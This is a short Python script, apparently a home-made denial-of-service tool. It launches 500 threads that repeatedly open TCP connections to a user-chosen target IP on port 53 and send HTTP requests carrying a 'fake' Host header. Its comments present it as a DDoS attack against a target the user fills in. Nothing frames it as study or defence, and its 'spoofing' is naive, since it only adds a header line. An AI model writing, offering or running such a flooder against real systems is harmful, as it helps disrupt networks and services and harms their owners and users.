import threading
import socket

# Set the target IP to the phone hotspot's IP address
# Replace with the IP Address,put it between the Squotation mark
target = 'PUT THE IP NUMBER YOU WANT TO TARGET'
port = 53
fake_ip = 'PUT ANY FAKE IP NUMBER '

already_connected = 0
lock = threading.Lock()


def attack():
    global already_connected

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))

            request = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
            s.sendto(request.encode("ascii"), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"),
                     (target, port))

            s.close()

            with lock:
                already_connected += 1
                print(already_connected)
        except socket.error as e:
            print(f"Error: {e}")
            break


# Launch multiple threads to simulate a DDoS attack
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
